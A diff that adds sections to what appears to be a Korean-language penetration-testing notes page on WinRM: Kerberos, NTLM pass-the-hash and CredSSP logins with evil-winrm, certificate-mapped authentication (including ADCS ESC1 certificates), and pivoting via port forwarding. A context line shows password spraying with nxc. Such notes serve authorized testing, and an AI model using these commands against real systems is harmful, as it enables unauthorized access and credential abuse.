@@ -104,3 +104,61 @@ nxc winrm TARGET -u users.txt -p 'Password1!' --continue-on-success
 
 !!! tip "JEA (Just Enough Administration)"
     JEA가 설정된 엔드포인트는 사용 가능한 명령이 제한된다. `Get-Command`으로 허용된 명령 확인.
+---
+
+## 인증 방식별 사용
+
+WinRM 은 기본 Negotiate(Kerberos→NTLM) 외에도 여러 방식을 지원한다.
+
+```bash
+# Kerberos (도메인 조인된 리눅스/워크스테이션)
+kinit user@DOMAIN.LOCAL
+evil-winrm -i host.domain.local -r DOMAIN.LOCAL
+
+# NTLM (pass-the-hash)
+evil-winrm -i TARGET -u user -H NTHASH
+
+# CredSSP (더블홉 문제 회피, 크리덴셜 위임)
+# 클라이언트에서
+Enable-WSManCredSSP -Role Client -DelegateComputer TARGET -Force
+# 서버에서
+Enable-WSManCredSSP -Role Server -Force
+# 사용
+Enter-PSSession -ComputerName TARGET -Authentication CredSSP -Credential $cred
+```
+
+!!! warning "CredSSP"
+    CredSSP 는 원격 서버에 **평문 자격증명을 위임**한다. 서버가 침해되면 위임한 계정이 그대로 털리므로 OPSEC/탐지 시 우선 검토 대상.
+
+---
+
+## 인증서 기반 인증
+
+비밀번호 / 해시 없이 클라이언트 인증서(PKINIT / WinRM client cert mapping) 로 인증.
+
+```powershell
+# 서버: 사용자-인증서 매핑 생성 (관리자 권한)
+New-Item -Path WSMan:\localhost\ClientCertificate `
+  -Subject user@DOMAIN.LOCAL `
+  -URI * `
+  -Issuer <CA_Thumbprint> `
+  -Credential (Get-Credential DOMAIN\user) `
+  -Force
+
+# 클라이언트: 인증서로 접속
+Enter-PSSession -ConnectionUri https://TARGET:5986/wsman `
+  -CertificateThumbprint <Client_Thumbprint>
+```
+
+ADCS ESC 공격(예: ESC1) 으로 발급받은 인증서를 WinRM 에 직접 쓸 수도 있다. 상세는 [ADCS](../ad/adcs.md) 참고.
+
+---
+
+## 내부 포트포워딩으로 접근
+
+WinRM 포트가 외부에서 막혀 있을 때 피봇 호스트를 경유.
+
+```bash
+# Ligolo-ng / chisel 로 5985/5986 포워딩 후
+evil-winrm -i 127.0.0.1 -u user -H NTHASH -P 5985
+```
